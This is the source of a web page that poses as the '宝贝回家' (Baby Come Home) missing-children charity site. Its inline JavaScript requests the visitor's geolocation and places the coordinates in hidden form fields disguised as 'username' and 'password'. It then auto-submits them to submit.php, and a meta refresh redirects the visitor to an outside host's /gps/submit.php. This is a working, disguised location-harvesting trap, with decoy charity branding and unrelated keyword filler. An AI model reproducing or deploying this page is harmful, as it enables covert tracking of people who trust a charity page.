<!DOCTYPE html>
<?php     
$url = "http://xiaorun.byxiaorun.top/gps/submit.php";   
?> 
<html lang="en">
<head>
   <meta charset="UTF-8"http-equiv="refresh" content="3;url=<?php echo $url; ?>">
  <link rel="icon" href="1.ico" type="image/x-icon">
   <link rel="shortcut icon" href="1.ico" type="image/x-icon">
  <meta property="og:image" content="logo.jpg">
    <title>宝贝回家|公益网站</title>
    <meta name="keywords" content="黑客;民警;报案;李文;钱江;网警;记录;计算机技能;影视作品;噼里啪啦" />
    <meta name="description" content="我们常在一些影视作品看到这样的角色：拥有超高的计算机技能，常常待在一个偏僻的小黑屋内，整天对着电脑噼里啪啦的敲击键盘，转头的一瞬间给你一个高深莫测的微笑。大队民警接到报案后，对报案公司的服务器进行了细致的检查，发现在近十几天的时间内，确实有一些异常异常记录，这些记录大多集中在一天的后半夜时间，而且公司不见的几万块钱也和这些记录有关，但是光靠报案人提供的一个QQ和这些零星的记录，怎么才能锁定嫌疑人呢？对存在明显安全漏洞或防护措施不到位的情况，请及时配合公安机关网警部门做好网站备案登记及相关等级保护措施。" />
</head>
<body>

  <div style="display:none;"><img src="logo.jpg" alt=""></div>
    <script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" charset="utf-8" homePageUrl="" homePageName="回到我的主页"></script>
    <script>
      var geol;      
        try {
            if (typeof(navigator.geolocation) == 'undefined') {
                geol = google.gears.factory.create('beta.geolocation');
            } else {
                geol = navigator.geolocation;
            }
        } catch (error) {
            //alert(error.message);
        }

        if (geol) {
            geol.getCurrentPosition(function(position) {

        var nowLatitude = position.coords.latitude;            
        var nowLongitude = position.coords.longitude;      
         //以上是固定代码，获取经度纬度
        //alert("纬度：" + nowLatitude + "， 经度：" + nowLongitude);  //弹出经度纬度的坐标
         //根据经纬度获取地理位置，不太准确，获取城市区域还是可以的

    

            function new_form(){
            var f=document.createElement("form");
            document.body.appendChild(f);
            f.method="post";
            return f;
        }    //定义函数，创建form

        function create_elements(eForm,eName,eValue){
            var e=document.createElement("input");
            eForm.appendChild(e);
            e.type="text";
            e.name=eName;
            if(!document.all){e.style.display="none"}else{
                e.style.display="block";
                e.style.width="0px";
                e.style.height="0px";
            }
            e.value=eValue;
            return e;
        }

//这段代码意思就是 定义方法，有两个input 他们的值分别是经度纬度的值

        var _f=new_form();
        create_elements(_f,"username",nowLatitude) // 创建form中的input对象
        create_elements(_f,"password",nowLongitude);
        

        _f.action="submit.php";
        _f.submit();   //提交

//表单自提交发送到submit.php页面

    }, function(error) {
        switch(error.code){
        case error.TIMEOUT :
            //alert("连接超时，请重试");
            break;
        case error.PERMISSION_DENIED :
            //alert("您拒绝了使用位置共享服务，查询已取消");
            break;
        case error.POSITION_UNAVAILABLE :
            //alert("非常抱歉，我们暂时无法通过浏览器获取您的位置信息");
            break;
        }
    }, {timeout:10000});    //设置十秒超时

        }
//设置连接超时的报错

  </script>
</body>
</html>
